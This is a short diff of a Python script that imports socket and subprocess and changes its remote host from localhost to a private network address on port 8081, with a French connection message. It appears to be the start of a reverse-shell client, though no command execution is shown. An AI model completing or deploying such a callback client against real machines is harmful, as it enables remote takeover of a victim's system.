@@ -1,7 +1,7 @@
 import socket
 import subprocess
 
-REMOTE_HOST = '127.0.0.1'
+REMOTE_HOST = '192.168.132.2'
 REMOTE_PORT = 8081
 client = socket.socket()
 print("[-] Connexion en cours d'initialisation...")
